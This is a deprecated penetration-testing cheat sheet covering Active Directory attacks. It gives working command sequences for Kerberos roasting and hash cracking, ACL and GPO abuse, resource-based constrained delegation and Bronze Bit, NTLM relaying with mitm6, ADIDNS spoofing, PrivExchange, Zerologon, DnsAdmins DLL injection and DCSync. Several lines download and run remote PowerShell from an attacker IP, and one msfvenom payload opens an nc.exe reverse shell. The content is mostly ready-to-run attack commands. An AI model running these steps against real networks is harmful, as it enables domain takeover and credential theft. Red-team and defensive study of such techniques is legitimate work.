[![homepage](https://img.shields.io/badge/Homepage-snovvcrash.github.io-success?style=social&logo=jekyll&logoColor=cc0000)](https://snovvcrash.github.io/)
[![github](https://img.shields.io/github/stars/snovvcrash/PPN?label=Star%20on%20GitHub&style=social)](https://github.com/snovvcrash/PPN)
[![twitter](https://img.shields.io/twitter/follow/snovvcrash?label=Follow%20on%20Twitter&style=social)](https://twitter.com/snovvcrash)

❗❗❗ **THIS PAGE IS DEPRECATED. THE PROJECT HAS MOVED [HERE](https://ppn.snovvcrash.rocks/)** ❗❗❗

⚠️ **DISCLAIMER.** All information contained in this blog post is provided for educational and research purposes only. The author is not responsible for any illegal use of any information published in this blog post. ⚠️

Use your <kbd>Ctrl</kbd>-<kbd>F</kbd> to navigate this mess.

[//]: # (# -- 5 spaces)
[//]: # (## -- 4 spaces)
[//]: # (### -- 3 spaces)
[//]: # (#### -- 2 spaces)
[//]: # (##### -- 1 space)

* TOC
{:toc}





# AD




## Roasting



### ASREPRoasting

Show domain users with `DONT_REQ_PREAUTH` flag set:

```
PowerView3 > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```


#### Normal

##### GetNPUsers.py

* [https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/](https://vbscrub.com/2020/02/22/impackets-getnpusers-script-explained/)

```
$ GetNPUsers.py megacorp.local/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.out
$ cat GetNPUsers.out | grep -v 'Client not found in Kerberos database'
$ hashcat -m 18200 -a 0 -w 4 -O --session=asprep -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
```

##### ASREPRoast.ps1

* [https://github.com/HarmJ0y/ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)

```
PS > Get-ASREPHash -Domain megacorp.local -UserName snovvcrash
```


#### Targeted

* [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)

Given GenericWrite/GenericAll DACL rights over a target, we can modify most of the user’s attributes. We can change a victim’s userAccountControl to not require Kerberos preauthentication, grab the user’s crackable AS-REP, and then change the setting back. (@harmj0y, [ref](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/))

```
PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
PowerView2 > Set-DomainObject -Identity snovvcrash -XOR @{useraccountcontrol=4194304} -Verbose
PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
ASREPRoast > Get-ASREPHash -Domain megacorp.local -UserName snovvcrash
PowerView2 > Set-DomainObject -Identity snovvcrash -XOR @{useraccountcontrol=4194304} -Verbose
PowerView2 > Get-DomainUser snovvcrash | ConvertFrom-UACValue
```



### Kerberoasting

* [https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/](https://www.harmj0y.net/blog/redteaming/kerberoasting-revisited/)
* [http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/](http://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)
* [https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
* [https://github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)
* [https://docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type](https://docs.microsoft.com/ru-ru/archive/blogs/openspecification/windows-configurations-for-kerberos-supported-encryption-type)
* [https://swarm.ptsecurity.com/kerberoasting-without-spns/](https://swarm.ptsecurity.com/kerberoasting-without-spns/)

Check `msDS-SupportedEncryptionTypes` attribute (if RC4 is enabled):

```
PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```


#### Normal

##### GetUserSPNs.py

```
$ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 [-request|-save] -outputfile tgsrep.in
$ hashcat -m 13100 -a 0 -w 4 -O --session=tgsrep -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
```

##### PowerView

* [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L2777)

```
PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
```


#### Targeted

We can execute 'normal' Kerberoasting instead: given modification rights on a target, we can change the user’s serviceprincipalname to any SPN we want (even something fake), Kerberoast the service ticket, and then repair the serviceprincipalname value. (@harmj0y, [ref](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/))

```
PowerView2 > Get-DomainUser snovvcrash | Select serviceprincipalname
PowerView2 > Set-DomainObject -Identity snovvcrash -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
PowerView2 > $User = Get-DomainUser snovvcrash 
PowerView2 > $User | Get-DomainSPNTicket | fl
PowerView2 > $User | Select serviceprincipalname
PowerView2 > Set-DomainObject -Identity snovvcrash -Clear serviceprincipalname
```




## ACL Abuse

* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)



### Hunt for ACLs


#### PowerView2

Search for interesting ACLs:

```
PowerView2 > Invoke-ACLScanner -ResolveGUIDs
```

Check if the attacker "MEGACORP\sbauer" has `GenericWrite` permissions on the "jorden" user object:

```
PowerView2 > Get-ObjectAcl -samAccountName jorden -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.IdentityReference -eq "MEGACORP\sbauer"}

InheritedObjectType   : All
ObjectDN              : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL  <== Victim (jorden)
ObjectType            : All
IdentityReference     : MEGACORP\sbauer  <== Attacker (sbauer)
IsInherited           : False
ActiveDirectoryRights : GenericWrite
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : ContainerInherit
InheritanceType       : All
AccessControlType     : Allow
ObjectSID             : S-1-5-21-3167813660-1240564177-918740779-3110
```


#### PowerView3

Search for interesting ACLs:

```
PowerView3 > Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceClass -match "user"}

AceType               : AccessAllowed
ObjectDN              : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
ActiveDirectoryRights : GenericWrite
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3167813660-1240564177-918740779-3110  <== Victim (jorden)
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3167813660-1240564177-918740779-3102  <== Attacker (sbauer)
AccessMask            : 131112
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

Check if the attacker "MEGACORP\sbauer" (`S-1-5-21-3167813660-1240564177-918740779-3102`) has `GenericWrite` permissions on the "jorden" user object:

```
PowerView3 > Get-DomainObjectAcl -Identity jorden -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericWrite" -and $_.SecurityIdentifier -eq "S-1-5-21-3167813660-1240564177-918740779-3102"}
```

Notes:

* PowerView 3.0 does not return `IdentityReference` property, which makes it less handy for this task (however, you may filter the output by the attacker's SID).
* `-ResolveGUIDs` switch shows `ObjectType` and `InheritedObjectType` properties in a human form (not in GUIDs).



### Exchange Windows Permissions

Privilege escalation with ACLs in AD by example of the `Exchange Windows Permissions` domain group.

Add user to the `Exchange Windows Permissions` group:

```
PS > Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members snovvcrash
```

Add DCSync rights with PowerView2:

```
PowerView2 > Add-ObjectAcl -TargetDistinguishedName "DC=megacorp,DC=local" -PrincipalName snovvcrash -Rights DCSync -Verbose
```

Add DCSync rights with PowerView3:

```
PS > $cred = New-Object System.Management.Automation.PSCredential("snovvcrash", $(ConvertTo-SecureString "Passw0rd!" -AsPlainText -Force))
PowerView3 > Add-DomainObjectAcl -TargetIdentity "DC=megacorp,DC=local" -PrincipalIdentity snovvcrash -Credential $cred -Rights DCSync -Verbose
```

Add DCSync rights with ntlmrelayx.py:

```
$ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
```

Add DCSync rights with aclpwn.py:

* [https://github.com/fox-it/aclpwn.py](https://github.com/fox-it/aclpwn.py)
* [https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
* [https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)

```
$ aclpwn -f snovvcrash -ft user -t megacorp.local -tt domain -d megacorp.local -du neo4j -dp neo4j --server 127.0.0.1 -u snovvcrash -p 'Passw0rd!' -sp 'Passw0rd!'
```

Add DCSync rights with ActiveDirectory module:

* [https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)

1. Получить ACL для корневого объекта (домен).
2. Получить SID для аккаунта, которому нужно дать DCSync.
3. Создать новый ACL и выставить в нем права "Replicating Directory Changes" (GUID `1131f6ad-...`) и "Replicating Directory Changes All" (GUID `1131f6aa-...`) для SID из п. 2.
4. Применить изменения.

```
PS > Import-Module ActiveDirectory
PS > $acl = Get-Acl "AD:DC=megacorp,DC=local"
PS > $user = Get-ADUser snovvcrash
PS > $sid = New-Object System.Security.Principal.SecurityIdentifier $user.SID
PS > $objectGuid = New-Object guid 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
PS > $identity = [System.Security.Principal.IdentityReference] $sid
PS > $adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
PS > $type = [System.Security.AccessControl.AccessControlType] "Allow"
PS > $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
PS > $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
PS > $acl.AddAccessRule($ace)
PS > $objectGuid = New-Object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
PS > $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
PS > $acl.AddAccessRule($ace)
PS > Set-Acl -AclObject $acl "AD:DC=megacorp,DC=local"
```




## GPO Abuse

* [https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://pentestmag.com/gpo-abuse-you-cant-see-me/](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
* [https://wald0.com/?p=179](https://wald0.com/?p=179)
* [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
* [https://github.com/EvotecIT/GPOZaurr](https://github.com/EvotecIT/GPOZaurr)



### Recon

Show all GPOs in the domain:

```
PowerView3 > Get-NetGPO -Domain megacorp.local | select cn,displayname
```

Search for GPOs that are controlled by the "MEGACORP\PolicyAdmins" group:

```
PowerView3 > Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "MEGACORP\PolicyAdmins"}
```

List computers that are affected by vulnerable (modifiable) GPO:

```
PowerView3 > Get-NetOU -GUID "00ff00ff-00ff-00ff-00ff-00ff00ff00ff" | % {Get-NetComputer -ADsPath $_}
```

Note: if I list all OUs affected by this GPO with PowerView, there will be no domain shown (like in BloodHound), but in Group Policy Manager we can see that it is presented.

Check if computer settings are enabled for this GPO (and enable them if not):

* [https://gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801](https://gist.github.com/snovvcrash/ecdc639b061fe787617d8d92d8549801)

```
PS > Get-Gpo VULN.GPO.NAME
PS > Set-GpoStatus VULN.GPO.NAME -Status AllSettingsEnabled
```



### Exploit

Create a task with a pwsh payload:

```
$ echo 'sc -path "c:\\windows\\temp\\poc.txt" -value "GPO Abuse PoC..."' | iconv -t UTF-16LE | base64 -w0; echo
cwBjACAALQBwAGEAdABoACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHAAbwBjAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAIgBHAFAATwAgAEEAYgB1AHMAZQAgAFAAbwBDAC4ALgAuACIACgA=
PS > New-GPOImmediateTask -TaskName Pentest -GPODisplayName VULN.GPO.NAME -CommandArguments '-NoP -NonI -W Hidden -Enc cwBjACAALQBwAGEAdABoACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABlAG0AcABcAHAAbwBjAC4AdAB4AHQAIgAgAC0AdgBhAGwAdQBlACAAIgBHAFAATwAgAEEAYgB1AHMAZQAgAFAAbwBDAC4ALgAuACIACgA=' -Force
```

Cleanup:

```
PS > New-GPOImmediateTask -GPODisplayName VULN.GPO.NAME -Remove -Force
```

Check when GP was last applied:

```
Cmd > GPRESULT /R
```




## Delegation Abuse

* [https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations)



### Unconstrained

* [https://adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)
* [https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)

```
PowerView3 > Get-DomainComputer -Unconstrained | select dnshostname,samaccountname,useraccountcontrol
```


### Resource-based Constrained Delegation (RBCD)

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/)
* [https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/](https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/)


#### RBCD from Windows

Load tools:

```
PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/powermad.ps1")
PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/powerview4.ps1")
```

Check if `ms-DS-MachineAccountQuota` allows to create new machine accounts:

```
PS > $root = [ADSI]"LDAP://RootDSE"
PS > $root.rootDomainNamingContext
DC=megacorp,DC=local
PowerView3 > Get-DomainObject -Identity "DC=megacorp,DC=local" | select ms-ds-machineaccountquota

ms-ds-machineaccountquota
-------------------------
                       10
```

Define credentials for the compromised account with the necessary DACL:

```
PS > $userWithDaclUsername = 'megacorp.local\snovvcrash'
PS > $userWithDaclPassword = ConvertTo-SecureString 'Qwe123!@#' -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential($userWithDaclUsername, $userWithDaclPassword)
```

Add new machine account and configure RBCD on the vulnerable host (DC01):

```
PS > New-MachineAccount -MachineAccount fakemachine1337 -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) -Verbose
PowerView3 > $computerSID = Get-DomainComputer -Identity fakemachine1337 -Properties ObjectSid -Verbose -Credential $cred | Select -Expand ObjectSid
PS > $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($computerSID))"
PS > $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS > $SD.GetBinaryForm($SDBytes, 0)
PowerView3 > Get-DomainComputer DC01.megacorp.local -Verbose -Credential $cred | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose -Credential $cred
PS > .\Rubeus.exe hash /domain:megacorp.local /user:fakemachine1337 /password:Passw0rd!
FC525C9683E8FE067095BA2DDC971889
```

Ask TGS for CIFT and HTTP:

```
PS > .\Rubeus.exe s4u /domain:megacorp.local /user:fakemachine1337 /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:DC01$ /msdsspn:CIFS/DC01.megacorp.local /altservice:HTTP /ptt
PS > klist
PS > cd \\DC01.megacorp.local\c$
PS > ls
PS > c:
PS > Enter-PSSession -ComputerName DC01.megacorp.local
PS > exit
```

Ask TGS for LDAP:

```
PS > .\Rubeus.exe s4u /domain:megacorp.local /user:fakemachine1337 /rc4:FC525C9683E8FE067095BA2DDC971889 /impersonateuser:DC01$ /msdsspn:LDAP/DC01.megacorp.local /ptt
PS > klist
PS > ...DCSync...
```

Cleanup:

```
PowerView3 > Get-DomainComputer DC01.megacorp.local -Verbose -Credential $cred | Set-DomainObject -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity' -Verbose -Credential $cred
```

##### PowerView 4.0

Configure RBCD on the vulnerable host (DC01):

```
PowerView4 > Set-DomainRBCD DC01 -DelegateFrom fakemachine1337 -Verbose
```

Cleanup:

```
PowerView4 > Set-DomainRBCD DC01 -Clear -Verbose
```


#### RBCD from Linux

Add new machine account:

```
$ addcomputer.py -computer-name 'fakemachine1337' -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC02.megacorp.local megacorp.local/snovvcrash:'Qwe123!@#'
```

Configure RBCD on the vulnerable host:

```
...rbcd-attack...
Or
...rbcd_permissions...
```

Ask TGS for LDAP:

```
$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'DC01' -dc-ip 10.10.13.37 megacorp.local/fakemachine1337:'Passw0rd!'
$ ...DCSync...
```

##### rbcd-attack

* [https://github.com/tothi/rbcd-attack](https://github.com/tothi/rbcd-attack)

Configure RBCD on the vulnerable host (DC01):

```
$ ./rbcd.py -f fakemachine1337 -t DC01 -dc-ip 10.10.13.37 megacorp.local/snovvcrash:'Qwe123!@#'
```

##### rbcd_permissions

* [https://github.com/NinjaStyle82/rbcd_permissions](https://github.com/NinjaStyle82/rbcd_permissions)

Configure RBCD on the vulnerable host (DC01) via PtH:

```
$ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u snovvcrash -H 79bfd1ab35c67c19715aea7f06da66ee:79bfd1ab35c67c19715aea7f06da66ee -l 10.10.13.37
```

##### Bronze Bit

**CVE-2020-17049**

* [https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
* [https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
* [https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)

```
PS > Get-KerberosAESKey -Password 'Passw0rd!' -Salt MEGACORP.LOCALfakemachine1337
AES128 Key: 01C7B89A74F7AEC1007DED2F3DE0A815
AES256 Key: 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98
```

```
$ addcomputer.py -computer-name fakemachine1337 -computer-pass 'Passw0rd!' -dc-ip 10.10.13.37 -dc-host DC01.megacorp.local megacorp.local/snovvcrash:'Qwe123!@#'
$ ./rbcd.py -t 'CN=dc01,OU=Domain Controllers,DC=megacorp,DC=local' -d megacorp.local -c 'CN=fakemachine1337,CN=Computers,DC=megacorp,DC=local' -u snovvcrash -H 79bfd1ab35c67c19715aea7f06da66ee:79bfd1ab35c67c19715aea7f06da66ee -l 10.10.13.37
$ getST.py -spn ldap/DC01.megacorp.local -impersonate 'administrator' -dc-ip 10.10.13.37 megacorp.local/fakemachine1337 -hashes :FC525C9683E8FE067095BA2DDC971889 -aesKey 211E8E3134ED797B0A2BF6C36D1A966B3BED2B24E4AAA9ECEED23D0ABF659E98 -force-forwardable
$ secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.10.13.37 -no-pass -k
```


#### DHCPv6 + WPAD + NTLM Relay + RBCD

* [https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
* [https://chryzsh.github.io/relaying-delegation/](https://chryzsh.github.io/relaying-delegation/)
* [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
* [https://www.exploit-db.com/docs/48282](https://www.exploit-db.com/docs/48282)
* [[PDF] From Zero Credential to Full Domain Compromise (Haboob Team)](https://drive.google.com/file/d/1htCGIt1Wcg53zCSGnRk4wfcKOk5A_YDP/view?usp=sharing)

```
$ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs [-debug]
$ sudo mitm6 -i eth0 -d megacorp.local --ignore-nofqdn
```




## ADIDNS Abuse

* [https://blog.netspi.com/exploiting-adidns/](https://blog.netspi.com/exploiting-adidns/)
* [https://blog.netspi.com/adidns-revisited/](https://blog.netspi.com/adidns-revisited/)
* [https://www.gosecure.net/blog/2019/02/20/abusing-unsafe-defaults-in-active-directory/](https://www.gosecure.net/blog/2019/02/20/abusing-unsafe-defaults-in-active-directory/)

0\. Load tools:

```
PS > IEX(New-Object Net.WebClient).DownloadString("http://10.10.13.37/powermad.ps1")
```

1\. Check if you are able to modify (add) AD DNS names:

```
PS > Get-ADIDNSZone -Credential $cred -Verbose
DC=megacorp.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=megacorp,DC=local
DC=RootDNSServers,CN=MicrosoftDNS,DC=DomainDnsZones,DC=megacorp,DC=local
DC=_msdcs.megacorp.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=megacorp,DC=local
DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=megacorp,DC=local

PS > Get-ADIDNSPermission -Credential $cred -Verbose | ? {$_.Principal -eq 'NT AUTHORITY\Authenticated Users'}
Principal             : NT AUTHORITY\Authenticated Users
IdentityReference     : S-1-5-11
ActiveDirectoryRights : CreateChild
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None
```

This `CreateChild` permission is what we need.

2\. Create, configure the new DNS name that could be likely exploited for spoofing with Attacker's IP and enable it. I chose `pc01` which was found in DNS cache:

```
PS > New-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
PS > $dnsRecord = New-DNSRecordArray -Type A -Data 10.10.13.37
PS > Set-ADIDNSNodeAttribute -Node pc01 -Attribute dnsRecord -Value $dnsRecord -Credential $cred -Verbose
PS > Enable-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
```

3\. Check the newly created DNS object and try to resolve it. AD will need some time (\~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol:

```
PS > Get-ADIDNSNodeAttribute -Node pc01 -Attribute dnsRecord -Credential $cred -Verbose
PS > Resolve-DNSName pc01
PS > cmd /c ping -n 1 pc01
```

4\. Cleanup:

```
PS > Remove-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbose
```




## User Hunt

* [http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
* [https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20](https://www.slideshare.net/harmj0y/i-hunt-sys-admins-20)



### Sessions Enum

* [http://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/](http://www.harmj0y.net/blog/powershell/powershell-and-win32-api-access/)
* [http://www.harmj0y.net/blog/powershell/powerquinsta/](http://www.harmj0y.net/blog/powershell/powerquinsta/)



### Derivative Local Admins

* [http://www.harmj0y.net/blog/redteaming/local-group-enumeration/](http://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
* [https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
* [https://wald0.com/?p=14](https://wald0.com/?p=14)
* [http://www.offensiveops.io/tools/bloodhound-working-with-results/](http://www.offensiveops.io/tools/bloodhound-working-with-results/)
* [[PDF] Pen Testing Active Directory Environments (Varonis)](https://drive.google.com/file/d/1OePiNlfL8-ZvbS0Ou27StfSJK6C2vA_J/view?usp=sharing)




## PrivExchange

**CVE-2019-0686, CVE-2019-0724**

* [https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
* [https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

Check:

* [https://twitter.com/_wald0/status/1091062691383238656](https://twitter.com/_wald0/status/1091062691383238656)

```
$ sudo ./Responder.py -I eth0 -Av
$ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.37 -ap '/test/test/test' exch01.megacorp.local --debug
```

Exploit:

```
$ sudo ntlmrelayx.py -t ldap://DC01.megacorp.local --escalate-user snovvcrash
$ python privexchange.py -d MEGACORP -u snovvcrash -p 'Passw0rd!' -ah 10.10.13.37 exch01.megacorp.local --debug
```




## Zerologon

**CVE-2020-1472**

* [https://www.secura.com/uploads/whitepapers/Zerologon.pdf](https://www.secura.com/uploads/whitepapers/Zerologon.pdf)
* [https://twitter.com/_dirkjan/status/1306280566313156608](https://twitter.com/_dirkjan/status/1306280566313156608)

Check:

* [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

```
$ ./zerologon_tester.py DC01 10.10.13.38
```

Exploit:

* [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
* [https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)

Exploits above **will break the domain!** Use this technique by @dirkjanm to abuse Zerologon safely:

* [https://dirkjanm.io/a-different-way-of-abusing-zerologon/](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)

```
$ sudo ntlmrelayx.py -t dcsync://DC01.megacorp.local -smb2support
$ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC02.megacorp.local
```




## DnsAdmins

* [https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)
* [http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
* [https://adsecurity.org/?p=4064](https://adsecurity.org/?p=4064)

Exploit:

```
$ msfvenom -p windows/x64/exec cmd='c:\users\snovvcrash\documents\nc.exe 127.0.0.1 1337 -e powershell' -f dll > inject.dll
PS > dnscmd.exe <HOSTNAME> /Config /ServerLevelPluginDll c:\users\snovvcrash\desktop\i.dll
PS > Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
```

Cleanup:

```
PS > reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
PS > (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
```




## Azure



### ADSync

* [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
* [https://blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)

```
PS > Azure-ADConnect -server 127.0.0.1 -db ADSync
```




## LAPS



### Enabled?

Check locally:

```
PS > gc "c:\program files\LAPS\CSE\Admpwd.dll"
PS > Get-FileHash "c:\program files\LAPS\CSE\Admpwd.dll"
PS > Get-AuthenticodeSignature "c:\program files\LAPS\CSE\Admpwd.dll"
```

Check in LDAP:

```
PowerView3 > Get-DomainObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=megacorp,DC=local"
PowerView3 > Get-DomainObject "CN=ms-Mcs-AdmPwdExpirationTime,CN=Schema,CN=Configuration,DC=megacorp,DC=local"
```




## DCSync



### Mimikatz

```
mimikatz # lsadump::dcsync /domain:megacorp.local /user:MEGACORP\krbtgt
mimikatz # lsadump::dcsync /domain:megacorp.local /user:krbtgt@megacorp.local
```



### Invoke-DCSync.ps1

* [https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1)

```
